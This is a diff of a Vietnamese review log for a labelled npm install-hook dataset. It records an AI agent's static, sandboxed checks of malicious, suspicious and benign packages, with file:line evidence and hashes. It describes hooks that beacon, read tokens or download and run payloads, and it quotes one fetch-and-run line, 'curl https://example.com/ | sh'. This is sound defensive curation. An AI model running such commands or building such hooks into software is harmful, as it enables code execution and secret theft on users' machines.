@@ -1,31 +1,102 @@
 # Hồ sơ kiểm tra nhãn tuần 2
 
-Trạng thái: **chờ TV2 (Phạm Minh Triết) kiểm tra chéo và xác nhận từng dòng**. Các nhãn dưới đây là đề xuất, chưa phải ground truth. Không chạy mã gói trên host và không tải gói độc vào repo.
+Trạng thái 2026-10-30: `labels.csv` có 22 nhãn (2 `benign`, 2 `suspicious`, 18 `malicious`). Codex đã duyệt tĩnh 17 phiên bản trong batch Datadog theo ủy quyền của Phạm Minh Triết; reviewer dùng nhãn cho thí nghiệm vẫn là Phạm Minh Triết. Ba ứng viên nghi vấn cũ chưa có mã để xác minh `file:dòng`. Không chạy mã gói trên host hoặc đưa archive độc vào repo.
 
-| Ứng viên | Nhãn đề xuất | Bằng chứng install hook và hành vi | Nguồn | TV2 |
+| Ứng viên | Nhãn đề xuất | Bằng chứng install hook và hành vi | Nguồn | Trạng thái duyệt |
 | --- | --- | --- | --- | --- |
 | `greensaver@1.2.3` | malicious | Báo cáo nguồn ghi `postinstall: node lib/greensaver.js`; script giải mã các file giả sourcemap, tải blob mã hóa và đưa mã sau giải mã vào `eval`. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-jfw2-6254-9cwg](https://github.com/advisories/GHSA-jfw2-6254-9cwg), [OSV MAL-2026-16138](https://github.com/ossf/malicious-packages/blob/f128a26926ba435054707f5af00821644544b030/osv/malicious/npm/greensaver/MAL-2026-16138.json) | Chưa duyệt |
 | `merge-grid-stats@1.5.0` | malicious | Báo cáo nguồn ghi `postinstall: node install-cb.js`; script khảo sát container và đọc token service account, biến môi trường có tên liên quan bí mật. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-vqp7-j6jf-34qm](https://github.com/advisories/GHSA-vqp7-j6jf-34qm), [OSV MAL-2026-13484](https://github.com/ossf/malicious-packages/blob/f8d6dbca88029f7084e1904bf07393368dc9681e/osv/malicious/npm/merge-grid-stats/MAL-2026-13484.json) | Chưa duyệt |
 | `carbon-monorepo@20.1.1` | malicious | Báo cáo nguồn ghi `postinstall` chạy `index.js`; đọc môi trường, `.npmrc` và log npm rồi gửi qua HTTP. Gói đã bị gỡ khỏi npm; chưa đối chiếu được tarball. | [GHSA-qqpg-vxw2-32f8](https://github.com/advisories/GHSA-qqpg-vxw2-32f8), [OSV MAL-2026-14229](https://github.com/ossf/malicious-packages/blob/4f8382c22379fc0093ad418cb40f30e203d946ed/osv/malicious/npm/carbon-monorepo/MAL-2026-14229.json) | Chưa duyệt |
-| `esbuild@0.24.0` | benign | Registry và manifest chính thức ghi `postinstall: node install.js`. Đã đọc tĩnh tarball phát hành: `install.js:253-284` tìm binary theo nền tảng, khi thiếu thì lấy đúng phiên bản từ npm registry và kiểm tra phiên bản binary. Đây là tác vụ cài binary của trình bundler; **có tải và chạy binary**. | [manifest bản phát hành](https://github.com/evanw/esbuild/blob/v0.24.0/npm/esbuild/package.json), [tài liệu cài đặt](https://esbuild.github.io/getting-started/) | Chưa duyệt |
-| `@swc/core@1.7.36` | benign | Registry ghi `postinstall: node postinstall.js`. Đã đọc tĩnh tarball phát hành: `postinstall.js:88-128` kiểm tra native binding; khi thiếu thử cài `@swc/wasm` cùng phiên bản. Đây là đường dự phòng của compiler; **có thể gọi npm install trong install hook**. | [trang bản phát hành](https://www.npmjs.com/package/@swc/core/v/1.7.36), [repo chính thức](https://github.com/swc-project/swc) | Chưa duyệt |
+| `esbuild@0.24.0` | benign (đã duyệt) | Registry và manifest chính thức ghi `postinstall: node install.js`. Đã đọc tĩnh tarball phát hành: `install.js:184-189,233-238,265-284` cài hoặc tải binary đúng gói/phiên bản và kiểm tra phiên bản binary. Đây là tác vụ cài binary của trình bundler; **có tải và chạy binary**. | [manifest bản phát hành](https://github.com/evanw/esbuild/blob/v0.24.0/npm/esbuild/package.json), [tài liệu cài đặt](https://esbuild.github.io/getting-started/) | Codex duyệt theo ủy quyền TV2, 29/10/2026 |
+| `@swc/core@1.7.36` | benign (đã duyệt) | Registry ghi `postinstall: node postinstall.js`. Đã đọc tĩnh tarball phát hành: `postinstall.js:79-97,113-128` kiểm tra native binding; khi thiếu thử cài `@swc/wasm` cùng phiên bản. Đây là đường dự phòng của compiler; **có thể gọi npm install trong install hook**. | [trang bản phát hành](https://www.npmjs.com/package/@swc/core/v/1.7.36), [mã nguồn tag v1.7.36](https://github.com/swc-project/swc/blob/v1.7.36/packages/core/postinstall.js) | Codex duyệt theo ủy quyền TV2, 29/10/2026 |
 
-Hai tarball lành được tải bằng `npm pack --ignore-scripts`, chỉ đọc tĩnh trong thư mục tạm bị ignore. SHA-512 của từng tarball khớp `dist.integrity` từ npm registry: `esbuild@0.24.0` = `sha512-FuLPevChGDshgSicjisSooU0cemp/sGXR841D5LHMB7mTVOmsEHcAxaH3irL53+8YDIeVNQEySh4DaYU/iuPqQ==`; `@swc/core@1.7.36` = `sha512-bu7ymMX+LCJOSSrKank25Jaq66ymLVA9fOUuy4ck3/6rbXdLw+pIJPnIDKQ9uNcxww8KDxOuJk9Ui9pqR+aGFw==`. Không thực thi hook.
+Hai tarball lành được tải bằng `npm pack --ignore-scripts`, chỉ đọc tĩnh trong thư mục tạm ngoài repo. SHA-512 của từng tarball khớp `dist.integrity` từ npm registry: `esbuild@0.24.0` = `sha512-FuLPevChGDshgSicjisSooU0cemp/sGXR841D5LHMB7mTVOmsEHcAxaH3irL53+8YDIeVNQEySh4DaYU/iuPqQ==`; `@swc/core@1.7.36` = `sha512-bu7ymMX+LCJOSSrKank25Jaq66ymLVA9fOUuy4ck3/6rbXdLw+pIJPnIDKQ9uNcxww8KDxOuJk9Ui9pqR+aGFw==`. Không thực thi hook.
 
 Ba nguồn malware đều bắt nguồn từ Amazon Inspector qua GitHub Advisory/OSV; hai URL cho cùng gói không phải hai kiểm tra độc lập. `npm view` trả E404/unpublished cho cả ba. Để nhập nhãn malicious theo hợp đồng có `file,lines`, TV2 cần bằng chứng dòng từ bản sao an toàn trong VM hoặc nguồn công khai đáng tin cậy có đánh số dòng. Nếu không lấy được, ghi `không xác minh được` và giữ ứng viên ngoài `labels.csv`.
 
-Nếu cả năm đề xuất được duyệt, quy tắc split hiện tại cho 4 gói vào `dev` và chỉ `@swc/core` vào `test`; tập test chưa có gói malicious. Cần thêm nhãn đã kiểm tra thuộc tập test trước khi dùng tập này để báo cáo recall/F1.
+Hai nhãn `benign` đã được chia theo cụm: `@swc/core` vào `dev`, `esbuild` vào `test`. Tập này chưa có nhãn `malicious` hoặc `suspicious`, nên không dùng để báo cáo accuracy, recall hay F1 của agent.
 
-## Việc TV2 cần ghi cho từng ứng viên
+## Kết quả kiểm tra theo ủy quyền TV2
 
 1. Xác minh `name@version`, lifecycle hook, mục đích và hành vi bằng nguồn độc lập hoặc phân tích tĩnh trong VM.
 2. Ghi đường dẫn file, dòng bằng chứng, nhãn cuối (`malicious`/`suspicious`/`benign`), nguồn và lý do. Với gói lành, xác nhận hành vi cài binary có giới hạn đúng gói/phiên bản.
-3. Điền tên người kiểm tra và ngày vào đây; sau đó TV1 mới đưa dòng đạt chuẩn vào `labels.csv` và chạy `prepare_labels`.
+3. Ghi người kiểm tra và ngày; chỉ đưa dòng đủ bằng chứng vào `labels.csv`. Codex đã duyệt và nhập hai dòng `benign` theo ủy quyền ngày 29/10/2026, rồi kiểm tra bằng `prepare_labels`.
 
-| Ứng viên | File:dòng đã xác minh | Nhãn TV2 | Lý do/nguồn độc lập | Người kiểm tra/ngày |
+| Ứng viên | File:dòng đã xác minh | Nhãn/trạng thái | Lý do/nguồn đối chiếu | Người kiểm tra/ngày |
 | --- | --- | --- | --- | --- |
-| `greensaver@1.2.3` | | | | |
-| `merge-grid-stats@1.5.0` | | | | |
-| `carbon-monorepo@20.1.1` | | | | |
-| `esbuild@0.24.0` | | | | |
-| `@swc/core@1.7.36` | | | | |
+| `greensaver@1.2.3` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; mô tả hành vi chưa thay cho mã có số dòng. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
+| `merge-grid-stats@1.5.0` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; chưa đối chiếu `install-cb.js`. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
+| `carbon-monorepo@20.1.1` | Không xác minh được: tarball đã bị gỡ | Chưa kết luận | GHSA và OSV cùng nguồn Amazon Inspector; chưa đối chiếu `index.js`. Cần mẫu trong VM hoặc nguồn công khai đáng tin cậy. | Codex hỗ trợ TV2, 2026-10-28 |
+| `esbuild@0.24.0` | `package.json:10`; `install.js:184-189,233-238,265-284` | `benign` — đã duyệt cho hành vi cài binary | Tarball có SHA-512 khớp `dist.integrity` npm Registry; [manifest tag v0.24.0](https://github.com/evanw/esbuild/blob/v0.24.0/npm/esbuild/package.json) xác nhận hook. Khi thiếu binary, script cài `@esbuild/*` đúng phiên bản hoặc tải từ Registry rồi kiểm tra phiên bản. Có thực thi binary để kiểm tra; chưa audit toàn bộ mã gói. | Codex, 2026-10-29 (TV2 ủy quyền) |
+| `@swc/core@1.7.36` | `package.json:49`; `postinstall.js:79-97,113-128` | `benign` — đã duyệt cho fallback compiler | Tarball có SHA-512 khớp `dist.integrity` npm Registry; [mã nguồn tag v1.7.36](https://github.com/swc-project/swc/blob/v1.7.36/packages/core/postinstall.js) mô tả fallback. Script thử native binding, nếu thiếu thì cài `@swc/wasm` cùng phiên bản. Có chạy `npm install` trong hook; chưa audit toàn bộ mã gói. | Codex, 2026-10-29 (TV2 ủy quyền) |
+
+Hai nhãn `benign` được duyệt trên bản phát hành có SHA-512 khớp npm Registry và đường cài đặt đã đọc tĩnh; không chứng minh mọi đường thực thi của gói vô hại. Hai dòng đã nhập `labels.csv` và `prepare_labels` gán split ổn định. Ba ứng viên nghi vấn vẫn ở ngoài bảng nhãn vì thiếu bằng chứng `file:dòng`; không dùng hai nhãn này để đo độ chính xác agent.
+
+## Đối chiếu 450 ứng viên metadata — 2026-10-29
+
+Codex đối chiếu từng `package@version` trong `public_candidates_450.csv` với manifest phiên bản trên npm Registry, gồm tên, phiên bản, lifecycle hook và sự hiện diện của `dist.integrity`. Kết quả từng dòng ở [`metadata_review_450.csv`](review_450/metadata_review_450.csv): 445 dòng `verified`, 5 dòng `unavailable` vì HTTP 404, không có cặp tên/phiên bản trùng. Cả 445 manifest truy cập được đều có integrity; 5 dòng không truy cập được có trạng thái integrity `unknown`.
+
+Năm dòng 404: `@s4yhiitestpoc/r2-echo@1.0.0`, `@s4yhiitestpoc/scan-echo-b@1.0.0`, `@s4yhiitestpoc/scan-https-d@1.0.0`, `@s4yhiitestpoc/r2-https-b@1.0.0`, `@s4yhiitestpoc/scan-dns-c@1.0.0`.
+
+**Quyết định nhãn:** 450/450 dòng là `needs_code_review`, chưa có nhãn mới nào được chuyển sang `labels.csv`. Manifest khớp và có integrity chỉ chứng minh dữ liệu phát hành được đối chiếu; không chứng minh hành vi lành. Năm gói 404 cũng không thể kết luận độc khi không có mã phát hành. Để chốt dữ liệu v1 cần bản mã đúng phiên bản, bằng chứng `file:dòng`, nguồn kiểm tra độc lập và người/ngày duyệt; ba ứng viên nghi vấn ban đầu vẫn thiếu các bằng chứng này. Lượt đối chiếu không tải tarball, chạy install script hay AI scan 450 gói.
+
+Tra cứu GitHub công khai theo tên ba gói nghi vấn và tên file install ngày 29/10 chỉ tìm thấy advisory hoặc bản sao advisory, chưa thấy mã nguồn của đúng bản phát hành. Các bản sao này không phải nguồn kiểm tra độc lập. Nếu có tarball hoặc ảnh chụp mã từ nguồn đáng tin cậy, cần kiểm tra trong VM cách ly rồi bổ sung đường dẫn `file:dòng` trước khi duyệt nhãn.
+
+## Duyệt tĩnh thêm một ứng viên — 2026-10-29
+
+| Gói | Kết luận | Bằng chứng đã đọc | Người duyệt |
+| --- | --- | --- | --- |
+| `@ma.vu/virus@1.0.3` | `suspicious`, không khẳng định `malicious` | `package.json:14-16` gọi `./moon.sh` ở `postinstall`; `moon.sh:2` chạy `env`, in toàn bộ biến môi trường ra stdout của quá trình cài đặt. `index.js:1-3` chỉ xuất hàm chào. Không thấy lệnh gửi dữ liệu ra mạng trong đường `postinstall` đã đọc. | Codex theo ủy quyền TV2, 29/10/2026 |
+
+Nguồn: [tarball npm đúng phiên bản](https://registry.npmjs.org/@ma.vu/virus/-/virus-1.0.3.tgz) và manifest npm `@ma.vu/virus@1.0.3`. Tarball được tải và đọc **chỉ trong Docker dùng một lần**, không mount host, `npm pack --ignore-scripts`; không chạy `moon.sh`. SHA-512 tarball tính trong container là `a08fe3aa2813c072f1cc6c49c5e219cba0f3edbf0ff5536c34b9f7e9509efbdbf9af3b78184ee0990c8f3e12cfd84efd1aaf70e408315737adadd55d854e83dd`, khớp `dist.integrity` của npm Registry. Nhãn `suspicious` mô tả nguy cơ lộ biến môi trường vào log; không có bằng chứng chiếm dụng bí mật hoặc exfiltration qua mạng. Dòng này đã được thêm vào `labels.csv`, `prepare_labels` xếp vào `dev`.
+
+Đã xem thêm `@amrahulmail/ctf-lab-evil@1.2.0` trong container. `postinstall.js:3-12` tự khai là bài lab với thông tin đăng nhập giả; `postinstall.js:33-48` gửi payload tới `example.com`. Vì đây là mô phỏng CTF, chưa nhập vào bảng nhãn dùng cho đánh giá gói thực. `metadata_review_450.csv` là ảnh chụp của lượt đối chiếu metadata trước hai lượt đọc mã này; trạng thái `needs_code_review` trong ảnh chụp không thay thế quyết định mới nhất ở `labels.csv` và hồ sơ này.
+
+## Đối chiếu advisory và kiểm tra mã trong Docker — 2026-10-29
+
+Truy vấn batch OSV với đúng 450 cặp `package@version` tìm thấy 8 cặp có advisory. Năm manifest đã trả HTTP 404 trong lượt đối chiếu metadata; `@s4yhiitestpoc/r2-dns@1.0.0` còn manifest nhưng tarball trả HTTP 404 khi `npm pack --ignore-scripts`. Hai tarball còn lấy được và đã đọc tĩnh trong Docker dùng một lần, không mount host hay chạy lifecycle script:
+
+| Gói | Nhãn duyệt | Bằng chứng mã đúng phiên bản | Đối chiếu độc lập |
+| --- | --- | --- | --- |
+| `exnesss@0.0.1` | `malicious` — beacon ngoài ý muốn khi cài đặt; chưa thấy lấy credential | `package.json:6-7` tự gọi `postinstall.js`; `postinstall.js:5` đặt miền OAST, `postinstall.js:10-11` gọi HTTPS tới đó, `postinstall.js:26` kích hoạt `ping()` ngay khi nạp. Đây là typosquat của `exness` và script không cung cấp tính năng cho người cài. | OSV [MAL-2026-11518](https://api.osv.dev/v1/vulns/MAL-2026-11518) tổng hợp hai phân tích riêng của Amazon Inspector và OpenSSF Package Analysis. Codex kiểm tra mã tarball, 29/10/2026. |
+| `@miurba/alcazaba@99.99.99` | `suspicious` — PoC nghiên cứu nhưng thật sự gửi metadata máy cài | `package.json:6-8` chạy `phone-home.js` ở cả `preinstall` và `postinstall`; `phone-home.js:26-36` thu hostname, username, thư mục hiện tại và tên biến môi trường CI; `phone-home.js:39-52` đưa chúng vào DNS lookup và HTTPS GET tới OAST. Chưa thấy đọc giá trị biến môi trường hoặc nội dung file. | OSV [MAL-2026-3410](https://api.osv.dev/v1/vulns/MAL-2026-3410) có nguồn Amazon Inspector và OpenSSF Package Analysis. Manifest tự mô tả là security research placeholder; Codex giữ nhãn `suspicious`, 29/10/2026. |
+
+Nguồn tarball: [`exnesss@0.0.1`](https://registry.npmjs.org/exnesss/-/exnesss-0.0.1.tgz) và [`@miurba/alcazaba@99.99.99`](https://registry.npmjs.org/@miurba/alcazaba/-/alcazaba-99.99.99.tgz). SHA-512 tính từ tarball trong container khớp `dist.integrity` của npm Registry: `exnesss` = `daeda9dbf5cb4fb43e1c8a89795e2fa5be22c53265c566a6ecb82e20c71da616a99e70bc45008feba826b89bda5d840fa3718672519f46268a14a81bf9526396`; `@miurba/alcazaba` = `f743d2339fcb152d2546766bb1c955fb4fbb9c2e525dc5fff1c8cc551ad6afcb70ea0a9385c854c8e20cd84b82f560ad77e9c70a37ceec85a8d31adac680969c`. Hai dòng đã vào `labels.csv`. `prepare_labels` xác nhận 5 dòng hợp lệ và chia theo cụm: `exnesss` ở `dev`, `@miurba/alcazaba` ở `test`.
+
+OSV là nguồn chọn ứng viên, không thay thế việc đọc mã. Lượt batch này chỉ tìm advisory đã biết, không xác nhận các gói không có hit là lành. Bộ 22 nhãn vẫn chưa đủ đại diện để công bố độ chính xác, recall hoặc F1 của agent; 17 nhãn mới cùng một chiến dịch.
+
+## Batch Datadog MUT-4831 — 2026-10-30
+
+Nguồn độc lập: [Datadog Security Labs — MUT-4831](https://securitylabs.datadoghq.com/articles/mut-4831-trojanized-npm-packages-vidar/). Archive đúng phiên bản lấy từ [Datadog malicious software packages dataset](https://github.com/DataDog/malicious-software-packages-dataset); URL từng archive nằm ở cột `source` của `labels.csv`. Codex đọc `package.json` và mã bằng `zipfile` trong Docker dùng một lần, chỉ đọc; không chạy `npm install`, lifecycle hook, payload hoặc AI scan. SHA-256 dưới đây là của file ZIP archive, không phải của tarball npm.
+
+18 phiên bản được kiểm tra; 17 phiên bản có hook `postinstall` nối đến file mã tồn tại và đường tải/giải nén/chạy tệp từ máy chủ ngoài. Gán nhãn `malicious` dựa trên mã tĩnh và đối chiếu phân tích Datadog. Bốn hook PowerShell (`sabaoa`, `sabay`, `sai`, `salli`) dùng `iwr` tải ZIP trong `package.json:25` rồi gọi `src/extract.js`; các phiên bản còn lại tải trong file JS. `react-icon-pkg@1.5.2` gọi `cmd.exe` chạy BAT. Dòng bằng chứng liệt kê vị trí URL, giải nén hoặc thực thi; không chứng minh payload đã chạy trong môi trường thật.
+
+| Phiên bản | Bằng chứng mã tĩnh | SHA-256 archive |
+| --- | --- | --- |
+| `abeya-tg-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `bc8efb220ba9ac086e226aaaeb3b4742055bac2fc82a1d2768bf2a614cdc5738` |
+| `bael-god-admin@1.0.0` | `package.json:25` → `src/extract.js:185,164,200` | `470e88a41242fdd4d87acb6d0e348f5d40a0aac56f2f018efb4979356f44f1f0` |
+| `bael-god-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `fc70e0148bd6f4dc87752f7260cbb59385d82fb6b4ed05b9deed6fd29b34d889` |
+| `bael-god-thanks@1.0.0` | `package.json:25` → `src/extract.js:185,164,200` | `d4bd2d45e97f9ae6a1616a23a4f921a7e6f93ea88d33cf5180f9d8737de750e3` |
+| `botty-fork-baby@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `767f7af3a0fc27cdaa2f76adadc5fb75e95dc502f94eb64b52d5a3ceb1e1db04` |
+| `cursor-ai-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `3bcda239f0077b5aa9cc28484d335ee0c01df2a033c8221a25ab4eb64edc0f5b` |
+| `cursor-app-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `fbd48c9f7fe12e773d81187930b4a13532a8d579386761f88e7aba7f51662ab8` |
+| `custom-telegram-bot-api@1.0.0` | `package.json:25` → `src/extract.js:173,161,188` | `75c2411792010a41453d156104b2ac90c6bb253f4333a46bc83a67b54c88c1ef` |
+| `custom-tg-bot-plan@1.0.1` | `package.json:25` → `src/dependencies.js:173,161,188` | `9b857e817b13ee676e67d4672a99b192d0b699f116e06d44f04942141a2142d6` |
+| `icon-react-fork@1.0.0` | `package.json:25` → `src/dependencies.js:173,161,188` | `8dfd1efb4a9854e3446be794ff3b2d1157cd81fef7af17984d555119aa4595c5` |
+| `react-icon-pkg@1.5.2` | `package.json:27` → `src/dependencies.js:250,267,279,287` | `571854ec860dde06b0d303b8480dc43b86de357ef9b623f4ac1c0e58579b3d07` |
+| `sabaoa-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:113,141,148` | `0a77f64a95461ecad30686cbef3f42896f8fb81fd594f1ef342eb257e64a5b0e` |
+| `sabay-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:93,118,124` | `0bf6c9a54a487acbb201c279f8c189e569adc984f577e7d75ff48ec7bbee0f81` |
+| `sai-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:85,110,116` | `8175caa37cf26824e66f40a9520db012613f6687cecf316262bdeb3796101c82` |
+| `salli-tg-api@1.0.0` | `package.json:25` (PowerShell tải ZIP) → `src/extract.js:85,110,116` | `536d7ff029b908670e974b725b8ca4708ed048d1c4580b723447650f7e91ece4` |
+| `telegram-bot-start@1.0.0` | `package.json:28` → `src/dependencies.js:173,161,188` | `45db866610e1fbed24e08190f034c1e834d5c42971fe8aa0ec54f0f6f8a70662` |
+| `telegram-bot-starter@1.2.7` | `package.json:28` → `src/dependencies.js:239,227,259` | `e98e837add0fe33fa55399b92334522df12056ccbe115059eddd0ed45904e6da` |
+
+Giữ `custom-tg-bot-plan@1.0.0` ở trạng thái `needs_code_review`: `package.json:25` gọi `node src/dependencies.js` nhưng file đó không có trong archive đúng phiên bản; có `src/extract.js` song hook không trỏ tới. Không suy ra mã đó đã được kích hoạt. 17 bản mới cùng `cluster=mut-4831`, `split=dev` để tránh rò rỉ cùng chiến dịch qua hai tập. Nhóm chỉ dùng các nhãn này sau kiểm tra chéo của Phạm Minh Triết; bộ dữ liệu vẫn mất cân bằng và chưa đủ đánh giá mô hình.
+
+## Sàng lọc nguồn để mở rộng nhãn — 2026-10-29
+
+Danh sách 450 gói hiện là **ứng viên metadata**, không phải 450 nhãn. Bộ lọc tên đơn giản (`test|demo|example|hello|dummy|poc|ctf|sandbox|fake|fail`) tìm thấy 64/450 gói có dấu hiệu là mẫu thử; đây chỉ là tín hiệu ưu tiên kiểm tra, không phải lý do tự động loại hoặc gán nhãn.
+
+Sàng lọc batch 01 (18 gói) bằng `npm pack --ignore-scripts` trong Docker dùng một lần, không mount host và không chạy hook, cho thấy metadata Registry chưa đủ để quyết định hành vi cài đặt: tarball `pinst@3.0.0` có `_postinstall` thay vì `postinstall` (`package.json:13-20`); tarball `contaazul-pinst@1.1.10` có `ignore_prei` và `ignore_posti` (`package.json:13-17`). Ngược lại, gói tên `safe-postinstall-test@0.0.1` khai báo `curl https://example.com/ | sh` trong `package.json:7`; tên gói không chứng minh an toàn. `my-postinstall-pkg@1.0.16` đọc `.bashrc` vào file trong thư mục dự án (`scripts/postinstall.sh:18-42`), còn `test-postinstall-o@1.1.2-beta6` in biến môi trường và đọc `.env` (`scripts/postinstall.js:4-19`). Các ca này mới là quan sát tĩnh; chưa nhập nhãn mới vào `labels.csv` vì cần quyết định phạm vi mẫu test và kiểm tra chéo bằng chứng.
+
+Để tăng bộ nhãn mà không bịa kết quả: lấy ứng viên độc từ [Datadog Malicious Software Packages Dataset](https://github.com/DataDog/malicious-software-packages-dataset) và [OpenSSF Malicious Packages](https://github.com/ossf/malicious-packages); lấy ứng viên lành có hook từ bản phát hành npm và tag mã nguồn chính thức. Xử lý mỗi batch 18 gói: đối chiếu tên/phiên bản và SHA-512 tarball, đọc tĩnh đường chạy install trong Docker, ghi `file:dòng`, nguồn và người/ngày duyệt; chỉ sau đó thêm vào `labels.csv`. Advisory hay việc không có advisory chỉ là nguồn chọn ứng viên, không tự trở thành nhãn cuối. Các mẫu test/demo giữ riêng để demo, tránh làm sai lệch bộ đánh giá.
